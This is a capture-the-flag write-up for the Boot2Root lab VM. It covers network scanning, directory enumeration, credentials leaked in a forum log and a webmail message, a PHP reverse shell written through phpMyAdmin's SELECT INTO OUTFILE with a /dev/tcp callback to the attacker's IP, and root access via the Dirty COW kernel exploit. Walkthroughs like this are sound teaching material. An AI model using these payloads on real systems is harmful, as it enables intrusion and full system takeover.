# Enumeration Part

After starting the machine, we have this interface:

![Boot2Root Interface](https://github.com/MouadDv/Boot2Root/blob/main/img/interface)

Unlike Snow-Crash, the machine doesn't provide us with any information such as IP address, users, or running services.

We can set the virtual machine network to bridge mode to communicate with it using our machine. [Bridge Mode](https://superuser.com/questions/227505/what-is-the-difference-between-nat-bridged-host-only-networking) allows us to easily scan the segment and identify machines in the network.

Using **nmap**, we can start [network reconnaissance](https://nmap.org/book/man-host-discovery.html) to quickly identify the IP of the machine without scanning all its ports. We can use the `-sn` option to ping all hosts and retrieve MAC addresses. Optionally, add `-v` for verbose mode to see all scanned machines (host up/down). In this case, we’ll skip verbose mode.



```bash
sudo nmap -sn -sV 192.168.1.0/24
```

![Nmap -sn Example](https://github.com/MouadDv/Boot2Root/blob/main/img/nmap_sn.png)

Our attacker machine's IP is **192.168.1.6**, so the target machine's IP is:

```
Nmap scan report for 192.168.1.5
Host is up (0.00030s latency).
MAC Address: 08:00:27:20:DD:61 (Oracle VirtualBox virtual NIC)
```

We know it’s the target machine because **nmap** recognizes it as an Oracle VirtualBox instance. We can verify the MAC address in the target VM’s settings.

Now, let’s scan for open ports:

```bash
sudo nmap -sC -sS -p- -vvv 192.168.1.5
```

![Nmap Scan Results](https://github.com/MouadDv/Boot2Root/blob/main/img/nmap_port.png)

### Results:

We found:

- IMAP port
- FTP port
- Two web server ports, one with title **Hack me if you can** (port 80).

![hackmeifyoucan](https://github.com/MouadDv/Boot2Root/blob/main/img/hackmeifyoucan.png)


### Web Directory Enumeration

To identify what the web servers are serving, we use **dirb** for both port 80 and port 443.

```bash
dirb http://192.168.1.5/
dirb https://192.168.1.5/
```

#### Port 80 Results

```
CODE:403
```

#### Port 443 Results

```
Scanning URL: https://192.168.1.5/
+ https://192.168.1.5/cgi-bin/ (CODE:403|SIZE:288)                   
==> DIRECTORY: https://192.168.1.5/forum/                             
==> DIRECTORY: https://192.168.1.5/phpmyadmin/                       
+ https://192.168.1.5/server-status (CODE:403|SIZE:293)              
==> DIRECTORY: https://192.168.1.5/webmail/                          
```

Inside `/forum`:

```
==> DIRECTORY: https://192.168.1.5/forum/images/                     
==> DIRECTORY: https://192.168.1.5/forum/includes/                   
...
```

Inside `/phpmyadmin`:

```
+ https://192.168.1.5/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
+ https://192.168.1.5/phpmyadmin/index.php (CODE:200|SIZE:7540)       
...
```

Inside `/webmail`:

```
==> DIRECTORY: https://192.168.1.5/webmail/plugins/administrator/      
==> DIRECTORY: https://192.168.1.5/webmail/plugins/calendar/          
...
```

# Exploit Part

### Step 1: Forum Analysis

Visiting the forum, we see topics. In one, **Probleme login ? - lmezard, 2015-10-08, 00:10**, the logs show:

![user](https://github.com/MouadDv/Boot2Root/blob/main/img/usersearch.png)

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

This password seems to work for the user `lmezard` on the forum. After logging in, we find their email: `laurie@borntosec.net`.


![emailfound](https://github.com/MouadDv/Boot2Root/blob/main/img/emailfound.png)

### Step 2: Database Credentials

In the webmail, we find this message:

![webmail](https://github.com/MouadDv/Boot2Root/blob/main/img/webmail.png)


```
Subject: DB Access
Hey Laurie,
You can connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
```

### Step 3: Reverse Shell via phpMyAdmin


With phpMyAdmin access that we found in the email, we can exploit the **SELECT INTO OUTFILE** feature to upload a reverse shell. We need a writable directory .

based on [instllation guid](https://github.com/My-Little-Forum/mylittleforum/wiki/Installation) we found that :
 **`/forum/templates_c`**, which has `777` permissions.

#### Reverse Shell Code:

the reverse shell that we can use :

```php
<?php
exec("bash -c 'bash -i >& /dev/tcp/192.168.1.6/2020 0>&1'");
?>
```

#### SQL Query:

And marge the reverse shell with  **select into outfile** to create a reverse shell with php that can run when  navigate to templates_c
```sql
SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.6/2020 0>&1\"');?>" INTO OUTFILE '/var/www/forum/templates_c/reverse.php';
```

Navigate to:

```
https://192.168.1.5/forum/templates_c/reverse.php
```

Start a listener:

```bash
nc -lvnp 2020
```

After we get access to the machine :

![shell](https://github.com/MouadDv/Boot2Root/blob/main/img/reverse_shell.png)


to enhance revershell we need to upgrade to tty, then we can use su and anther command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

to get root machine we start search for any possible vulnerability , so we start first with kernel version  after run uname -a to get all info about the system that we in , we get the resutl:

```
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
```

after search the linux kerenl 3.2.0.91 part of a  famous vulnerability dirty cow:

more info : 

- https://www.youtube.com/watch?v=CQcgz43MEZg
- https://www.youtube.com/watch?v=FKdZ0QEIga8
- https://chao-tic.github.io/blog/2017/05/24/dirty-cow

after you read resource we can use dirty cow or dirty copy-on-write race condation to overwrite the /etc/password and change the passowrd of the root directly 

we can copy the exploit and paste like that :
cat > dirty.c << EOF

and then gcc dirty.c -o dirty -pthread -lcrypt

and type password that we want to change to and wait for race condation, now we upgrade the tty and su root

![root](https://github.com/MouadDv/Boot2Root/blob/main/img/root.png)
